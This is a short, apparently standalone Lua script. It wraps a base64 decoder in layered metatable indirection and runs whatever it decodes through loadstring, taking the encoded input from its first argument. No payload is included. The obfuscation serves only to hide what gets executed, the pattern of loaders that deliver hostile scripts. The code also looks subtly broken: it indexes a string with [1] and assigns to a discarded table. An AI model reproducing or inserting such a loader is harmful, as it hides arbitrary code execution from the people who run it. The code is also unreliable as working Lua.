__enter__ = ({...})[1]
setmetatable({},{
    __index = {
        [0] = function(...)
            loadstring(...)()
        end
    }
})[0](setmetatable({},{
    __index = {
        [0] = function(...)
            local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
            ({...})[1] = string.gsub(({...})[1], '[^'..b..'=]', '')
            return (({...})[1]:gsub('.', function(x)
                if (x == '=') then return '' end
                local r,f='',(b:find(x)-1)
                for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
                return r;
            end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
                if (#x ~= 8) then return '' end
                local c=0
                for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
                return string.char(c)
            end))
        end
    }
})[0](__enter__[1]))
